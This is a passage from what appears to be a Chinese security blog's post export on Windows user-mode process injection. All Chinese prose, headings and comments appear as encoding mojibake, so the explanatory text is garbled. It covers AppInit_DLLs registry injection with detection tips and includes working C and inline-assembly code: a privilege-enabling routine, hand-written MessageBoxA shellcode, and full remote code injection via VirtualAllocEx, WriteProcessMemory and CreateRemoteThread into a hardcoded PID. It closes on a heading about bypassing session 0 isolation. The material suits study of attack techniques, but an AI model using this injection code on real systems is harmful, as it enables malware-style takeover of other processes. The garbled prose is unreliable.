<p><strong>ä½¿ç”¨æ³¨å†Œè¡¨ AppInit_DLLså†™å…¥è¦æ³¨å…¥çš„DLLè·¯å¾„å­—ç¬¦ä¸²ç„¶åæŠŠLoadAppInit_DLLså€¼è®¾ç½®ä¸º1ï¼Œé‡å¯åï¼ŒDLLä¼šæ³¨å…¥æ‰€æœ‰è¿è¡Œè¿›ç¨‹ï¼ˆuser32.dllè¢«åŠ è½½åˆ°è¿›ç¨‹æ—¶ï¼Œä¼šè¯»å–AppInit_DLLsæ³¨å†Œè¡¨é¡¹ï¼Œè‹¥æœ‰å€¼åˆ™è°ƒç”¨loadLibraryåŠ è½½ç”¨æˆ·dllï¼Œå³ä½†å‡¡æ˜¯å¯¼å…¥äº†user32.dllçš„ç¨‹åºéƒ½ä¼šåŠ è½½è¯¥æ¨¡å—ï¼‰</strong></p>
<p><strong>åœ¨è‡ªå·±çš„win7è™šæ‹Ÿæœºè¯•äº†å‡ æ¬¡ ä½¿ç”¨è¯¥æ–¹æ³•æ€»æ˜¯ä¼šè“å±ã€‚ã€‚ã€‚ï¼ˆwin7sp1ç‰ˆï¼‰</strong></p>
<p>64ä½ç³»ç»Ÿï¼š<br>AppInit_Dlls(64ä½ç¨‹åºè¯»å–)<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows [AppInit_DLLs]</p>
<p>AppInit_Dlls(32ä½ç¨‹åºè¯»å–)<br>HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows [AppInit_DLLs]</p>
<p>32ä½ç³»ç»Ÿï¼š<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows [AppInit_DLLs]</p>
<p><img src="/posts/5329b9a8/1.png" alt="img"></p>
<h5 id="æ’æŸ¥æ–¹æ³•"><a href="#æ’æŸ¥æ–¹æ³•" class="headerlink" title="æ’æŸ¥æ–¹æ³•"></a>æ’æŸ¥æ–¹æ³•</h5><ul>
<li>ç›‘æµ‹åŠ è½½User32.dllçš„è¿›ç¨‹çš„dllçš„åŠ è½½ï¼Œç‰¹åˆ«æ˜¯æŸ¥æ‰¾ä¸æ˜¯é€šå¸¸çš„dllï¼Œæˆ–è€…ä¸æ˜¯æ­£å¸¸åŠ è½½çš„dllã€‚</li>
<li>ç›‘è§†AppInit_DLLsæ³¨å†Œè¡¨å€¼ã€‚</li>
<li>ç›‘è§†å’Œåˆ†ææ³¨å†Œè¡¨ç¼–è¾‘çš„APIè°ƒç”¨ï¼Œå¦‚RegCreateKeyExå’ŒRegSetValueEx</li>
</ul>
<h4 id="æ‰«æè¿›ç¨‹å†…å­˜â€”â€”ç”¨æˆ·å±‚dllæ³¨å…¥ç®€å•åˆ¤æ–­"><a href="#æ‰«æè¿›ç¨‹å†…å­˜â€”â€”ç”¨æˆ·å±‚dllæ³¨å…¥ç®€å•åˆ¤æ–­" class="headerlink" title="æ‰«æè¿›ç¨‹å†…å­˜â€”â€”ç”¨æˆ·å±‚dllæ³¨å…¥ç®€å•åˆ¤æ–­"></a>æ‰«æè¿›ç¨‹å†…å­˜â€”â€”ç”¨æˆ·å±‚dllæ³¨å…¥ç®€å•åˆ¤æ–­</h4><p>å¯ä»¥å…³æ³¨ä¸‹æ˜¯å¦æœ‰æ‰§è¡Œæƒé™</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;psapi.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">ScanProcessMemory</span><span class="params">(HANDLE hProc)</span></span><br><span class="line">&#123;</span><br><span class="line">	SIZE_T stSize = <span class="number">0</span>;</span><br><span class="line">	PBYTE pAddress = (PBYTE)<span class="number">0</span>;</span><br><span class="line">	SYSTEM_INFO sysinfo;</span><br><span class="line">	MEMORY_BASIC_INFORMATION mbi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//è·å–é¡µçš„å¤§å°</span></span><br><span class="line">	ZeroMemory(&amp;sysinfo, <span class="keyword">sizeof</span>(SYSTEM_INFO));</span><br><span class="line">	GetSystemInfo(&amp;sysinfo);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// å¾—åˆ°çš„é•œåƒåŸºåœ°å€</span></span><br><span class="line">	pAddress = (PBYTE)sysinfo.lpMinimumApplicationAddress;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;------------------------------------------------------------------------ \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;å¼€å§‹åœ°å€ \t ç»“æŸåœ°å€ \t\t å¤§å° \t çŠ¶æ€ \t å†…å­˜ç±»å‹ \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;------------------------------------------------------------------------ \n&quot;</span>);</span><br><span class="line">	<span class="comment">// åˆ¤æ–­åªè¦å½“å‰åœ°å€å°äºæœ€å¤§åœ°å€å°±å¾ªç¯</span></span><br><span class="line">	<span class="keyword">while</span> (pAddress &lt; (PBYTE)sysinfo.lpMaximumApplicationAddress)</span><br><span class="line">	&#123;</span><br><span class="line">		ZeroMemory(&amp;mbi, <span class="keyword">sizeof</span>(MEMORY_BASIC_INFORMATION));</span><br><span class="line">		stSize = VirtualQueryEx(hProc, pAddress, &amp;mbi, <span class="keyword">sizeof</span>(MEMORY_BASIC_INFORMATION));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (stSize == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			pAddress += sysinfo.dwPageSize;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08X \t 0x%08X \t %8d K \t &quot;</span>, mbi.BaseAddress,</span><br><span class="line">		((DWORD)mbi.BaseAddress + (DWORD)mbi.RegionSize),mbi.RegionSize&gt;&gt;<span class="number">10</span>);</span><br><span class="line">		<span class="keyword">switch</span> (mbi.State)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> MEM_FREE: <span class="built_in">printf</span>(<span class="string">&quot;ç©ºé—² \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> MEM_RESERVE: <span class="built_in">printf</span>(<span class="string">&quot;ä¿ç•™ \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> MEM_COMMIT: <span class="built_in">printf</span>(<span class="string">&quot;æäº¤ \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">&quot;æœªçŸ¥ \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (mbi.Type)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> MEM_PRIVATE:   <span class="built_in">printf</span>(<span class="string">&quot;ç§æœ‰  \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> MEM_MAPPED:    <span class="built_in">printf</span>(<span class="string">&quot;æ˜ å°„  \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> MEM_IMAGE:     <span class="built_in">printf</span>(<span class="string">&quot;é•œåƒ  \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">&quot;æœªçŸ¥  \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (mbi.Protect == <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_EXECUTE)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;E--&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_EXECUTE_READ)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ER-&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_EXECUTE_READWRITE)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ERW&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_READONLY)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;-R-&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_READWRITE)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;-RW&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_WRITECOPY)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;WCOPY&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_EXECUTE_WRITECOPY)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;EWCOPY&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// æ¯æ¬¡å¾ªç¯ç´¯åŠ å†…å­˜å—çš„ä½ç½®</span></span><br><span class="line">		pAddress = (PBYTE)mbi.BaseAddress + mbi.RegionSize;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());</span><br><span class="line">	ScanProcessMemory(hProc);</span><br><span class="line">	CloseHandle(hProc);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/5329b9a8/2.png" alt="img"></p>
<h4 id="ææƒå‡½æ•°"><a href="#ææƒå‡½æ•°" class="headerlink" title="ææƒå‡½æ•°"></a>ææƒå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span><br><span class="line">&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">			              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span>( !AdjustTokenPrivileges(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æŸ¥æ‰¾å‡½æ•°åœ°å€"><a href="#æŸ¥æ‰¾å‡½æ•°åœ°å€" class="headerlink" title="æŸ¥æ‰¾å‡½æ•°åœ°å€"></a>æŸ¥æ‰¾å‡½æ•°åœ°å€</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Messagebox</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(_In_ HMODULE hModule,</span></span><br><span class="line"><span class="params">	_In_ LPCSTR lpProcName)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HINSTANCE  libaddr = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åŠ¨æ€åº“åŸºåœ°å€: 0x%x\n&quot;</span>, libaddr);</span><br><span class="line">    GetProcAddress(libaddr, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HINSTANCE proc = (MYPROC)GetProcAddress(libaddr, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å‡½æ•°åœ°å€ï¼š0x%x\n&quot;</span>, proc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(_In_ HMODULE hModule,</span></span><br><span class="line"><span class="params">	_In_ LPCSTR lpProcName)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">/*HINSTANCE  libaddr = LoadLibraryA(&quot;user32.dll&quot;);</span></span><br><span class="line"><span class="comment">	printf(&quot;åŠ¨æ€åº“åŸºåœ°å€: 0x%x\n&quot;, libaddr);</span></span><br><span class="line"><span class="comment">	GetProcAddress(libaddr, &quot;MessageBoxA&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	HINSTANCE proc = (MYPROC)GetProcAddress(libaddr, &quot;MessageBoxA&quot;);</span></span><br><span class="line"><span class="comment">	printf(&quot;å‡½æ•°åœ°å€ï¼š0x%x\n&quot;, proc);*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// mamor</span></span><br><span class="line">	<span class="comment">//6D 61 6D 6F     72 00 00 00 </span></span><br><span class="line">	<span class="comment">//user32.llåŠ¨æ€åº“åŸºåœ°å€: 0x75770000</span></span><br><span class="line">	<span class="comment">//MessageBoxAå‡½æ•°åœ°å€ï¼š0x757f1300</span></span><br><span class="line">	<span class="comment">//char* str = &quot;FLAG&quot;;</span></span><br><span class="line"></span><br><span class="line">	LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	_asm &#123;</span><br><span class="line">		sub esp,<span class="number">0x60</span>	<span class="comment">//æŠ¬é«˜æ ˆ</span></span><br><span class="line">		xor ebx,ebx</span><br><span class="line">		push ebx</span><br><span class="line">		push <span class="number">0x20202072</span></span><br><span class="line">		push <span class="number">0x6F6D616D</span>	<span class="comment">//å­—ç¬¦ä¸²mamor</span></span><br><span class="line"></span><br><span class="line">		mov eax, esp</span><br><span class="line">		push ebx  <span class="comment">//0è¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸ</span></span><br><span class="line"></span><br><span class="line">		push <span class="number">0x20202072</span></span><br><span class="line">		push <span class="number">0x6F6D616D</span></span><br><span class="line"></span><br><span class="line">		mov ecx, esp <span class="comment">//è·å–ç¬¬äºŒä¸ªå­—ç¬¦ä¸²çš„åœ°å€</span></span><br><span class="line">		<span class="comment">//MessageBoxA(0,&quot;&quot;,&quot;&quot;,0)</span></span><br><span class="line">		push ebx</span><br><span class="line">		push eax</span><br><span class="line">		push eax</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax, <span class="number">0x757f1300</span> <span class="comment">//MessageBoxAåœ°å€</span></span><br><span class="line">		call eax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯ä»¥ä½¿ç”¨od x32dbgç­‰è·å–æœºå™¨ç  ç„¶ååœ¨ä½¿ç”¨å†…è”æ±‡ç¼–å»è°ƒç”¨å³å¯</p>
<h4 id="æ­£åˆ™è¡¨è¾¾å¼-shellcodeè½¬æ¢"><a href="#æ­£åˆ™è¡¨è¾¾å¼-shellcodeè½¬æ¢" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼ shellcodeè½¬æ¢"></a>æ­£åˆ™è¡¨è¾¾å¼ shellcodeè½¬æ¢</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">([0-9a-fA-F]&#123;2&#125;)`  æ›¿æ¢ä¸º `0x\1</span><br></pre></td></tr></table></figure>

<p><img src="/posts/5329b9a8/3.png" alt="img"></p>
]]></content>
      <categories>
        <category>ç”¨æˆ·æ€æ³¨å…¥</category>
      </categories>
      <tags>
        <tag>ç”¨æˆ·æ€æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»£ç æ³¨å…¥</title>
    <url>/posts/843cce96/</url>
    <content><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">	FARPROC func[<span class="number">2</span>];  <span class="comment">//loadlibraryA GetProcAddress åœ°å€</span></span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">4</span>][<span class="number">128</span>];  <span class="comment">//äºŒçº§æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">&#125; _DATA ,*THREAD_PARAM ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰ loadlibraryAå‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">WINBASEAPI</span></span><br><span class="line"><span class="comment">_Ret_maybenull_</span></span><br><span class="line"><span class="comment">HMODULE</span></span><br><span class="line"><span class="comment">WINAPI</span></span><br><span class="line"><span class="comment">LoadLibraryA(</span></span><br><span class="line"><span class="comment">	_In_ LPCSTR lpLibFileName</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HMODULE</span><span class="params">(WINAPI* loadLibraryA)</span><span class="params">(LPCSTR lpLibFileName)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰ GetProcAddressæŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">WINBASEAPI</span></span><br><span class="line"><span class="comment">FARPROC</span></span><br><span class="line"><span class="comment">WINAPI</span></span><br><span class="line"><span class="comment">GetProcAddress(</span></span><br><span class="line"><span class="comment">	_In_ HMODULE hModule,</span></span><br><span class="line"><span class="comment">	_In_ LPCSTR lpProcName</span></span><br><span class="line"><span class="comment">	);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HMODULE</span><span class="params">(WINAPI* getProcAddress)</span><span class="params">(HMODULE hModule, LPCSTR lpProcName)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MessageBoxA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">WINUSERAPI</span></span><br><span class="line"><span class="comment">int</span></span><br><span class="line"><span class="comment">WINAPI</span></span><br><span class="line"><span class="comment">MessageBoxA(</span></span><br><span class="line"><span class="comment">	_In_opt_ HWND hWnd,</span></span><br><span class="line"><span class="comment">	_In_opt_ LPCSTR lpText,</span></span><br><span class="line"><span class="comment">	_In_opt_ LPCSTR lpCaption,</span></span><br><span class="line"><span class="comment">	_In_ UINT uType);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* messageBoxA)</span><span class="params">( </span></span><br><span class="line"><span class="params">	HWND hWnd,</span></span><br><span class="line"><span class="params">	LPCSTR lpText,</span></span><br><span class="line"><span class="params">	LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">	UINT uType)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">shellCode</span><span class="params">(LPVOID lparam)</span> &#123;</span><br><span class="line">	THREAD_PARAM param = (THREAD_PARAM)lparam;   <span class="comment">//å®šä¹‰æˆæŒ‡é’ˆç±»å‹</span></span><br><span class="line">	HMODULE hmod = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//åŠ è½½user32.dll </span></span><br><span class="line">	<span class="comment">// param-&gt;func[0]   loadlibraryA</span></span><br><span class="line">	<span class="comment">//param-&gt;buffer[0]  user32.dll</span></span><br><span class="line">	hmod = ((loadLibraryA)param-&gt;func[<span class="number">0</span>])(param-&gt;buffer[<span class="number">0</span>]); 	<span class="comment">// loadlibraryA()</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//è·å–messageBoxA</span></span><br><span class="line">	<span class="comment">//param-&gt;func[1]  GetProcAddress</span></span><br><span class="line">	<span class="comment">//param.buffer[1] &quot;MessageBoxA&quot;</span></span><br><span class="line">	<span class="comment">//param.buffer[2] &quot;title&quot;</span></span><br><span class="line">	<span class="comment">//param.buffer[3] &quot;text&quot;</span></span><br><span class="line">	FARPROC messageboxfun = (FARPROC)((getProcAddress)param-&gt;func[<span class="number">1</span>])(hmod, param-&gt;buffer[<span class="number">1</span>]);</span><br><span class="line">	<span class="comment">//MessageBoxAå¼¹çª—</span></span><br><span class="line">	((messageBoxA)messageboxfun)(<span class="literal">NULL</span>, param-&gt;buffer[<span class="number">2</span>], param-&gt;buffer[<span class="number">3</span>], <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">injectCode</span><span class="params">(<span class="type">int</span> pid)</span> &#123;</span><br><span class="line">	_DATA param = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	LPVOID remoteBuf[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HMODULE hmod = GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	param.func[<span class="number">0</span>] = GetProcAddress(hmod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	param.func[<span class="number">1</span>] = GetProcAddress(hmod, <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strcpy</span>(param.buffer[<span class="number">0</span>], <span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(param.buffer[<span class="number">1</span>], <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(param.buffer[<span class="number">2</span>], <span class="string">&quot;title&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(param.buffer[<span class="number">3</span>], <span class="string">&quot;text&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//æ‰“å¼€è¿›ç¨‹</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid );</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//åˆ†é…Paramç»“æ„ä½“å†…å­˜</span></span><br><span class="line">	<span class="type">int</span> size = <span class="keyword">sizeof</span>(_DATA);</span><br><span class="line">	remoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="comment">//æŠŠæ•°æ®å†™å…¥ç›®æ ‡å†…å­˜</span></span><br><span class="line">	WriteProcessMemory(hProcess, remoteBuf[<span class="number">0</span>], &amp;param, size, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//å°†ä»£ç å†™å…¥åˆ°ç›®æ ‡å†…å­˜</span></span><br><span class="line">	size = (DWORD)injectCode - (DWORD)shellCode; <span class="comment">//å¾—åˆ°shellcodeä»£ç å¤§å°</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, size);</span><br><span class="line">	remoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(hProcess, remoteBuf[<span class="number">1</span>], shellCode, size, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	HANDLE thread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, remoteBuf[<span class="number">1</span>], remoteBuf[<span class="number">0</span>], <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == thread) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	WaitForSingleObject(thread,INFINITE);</span><br><span class="line">	CloseHandle(thread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*if (argc != 2)</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		printf(&quot;è¯·è¾“å…¥pid&quot;);</span></span><br><span class="line"><span class="comment">		return;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	int pid = atol(argv[1]);*/</span></span><br><span class="line">	injectCode(<span class="number">13968</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>éœ€è¦åœ¨releaseä¸‹ç”Ÿæˆ</p>
<p><img src="/posts/843cce96/1.png" alt="img"></p>
]]></content>
      <categories>
        <category>ç”¨æˆ·æ€æ³¨å…¥</category>
      </categories>
      <tags>
        <tag>ç”¨æˆ·æ€æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>ZwCreateThreadExè¿œç¨‹çº¿ç¨‹æ³¨å…¥</title>
    <url>/posts/215f7b36/</url>
    <content><![CDATA[<p>session 0å®‰å…¨æœºåˆ¶ç»•è¿‡æ³¨å…¥</p>
